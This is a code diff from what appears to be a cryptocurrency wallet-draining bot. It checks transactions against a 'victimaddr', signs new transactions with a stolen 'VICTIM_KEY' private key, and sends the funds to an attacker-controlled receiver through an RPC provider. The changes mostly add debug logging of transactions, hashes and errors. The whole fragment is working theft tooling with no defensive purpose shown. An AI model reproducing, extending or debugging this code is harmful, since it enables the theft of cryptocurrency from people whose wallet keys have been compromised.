@@ -640,7 +640,7 @@ if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
   if(results) {
     request.log.info("got to result eth2");
     provider =  new providers.JsonRpcProvider(AnkrId2)
-    web3 = new  Web3(new Web3.providers.HttpProvider(AnkrId2));
+    // web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
     await cancelandsend(request, results.get("pkaddr"), recver2, provider, web3)
   //  await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
   
@@ -1301,8 +1301,10 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
       // optional data field to send message or execute smart contract
      };
     
+    
      request.log.info("Created transaction");
      request.log.info("i got here12");
+     request.log.info(JSON.stringify(transaction));
      var signedTx = await web3.eth.accounts.signTransaction(transaction, VICTIM_KEY);
     
      request.log.info("Signed transaction");
@@ -1311,7 +1313,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
      
       {
         // loggerr.info(hash.toString());
-        request.log.info("got hash")
+        request.log.info("got hash:"+hash)
         request.log.info("i got here14");
         request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
       }).on('receipt', async (reciept: any) => {
@@ -1330,6 +1332,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
       //  await mshlogger(request, JSON.stringify(error), loggerr)
        request.log.info("got error")
        request.log.info("i got here16");
+       request.log.info(JSON.stringify(error))
        await mshlogger(request, JSON.stringify(error), error)
         // loggerr.info(JSON.stringify(error));
      
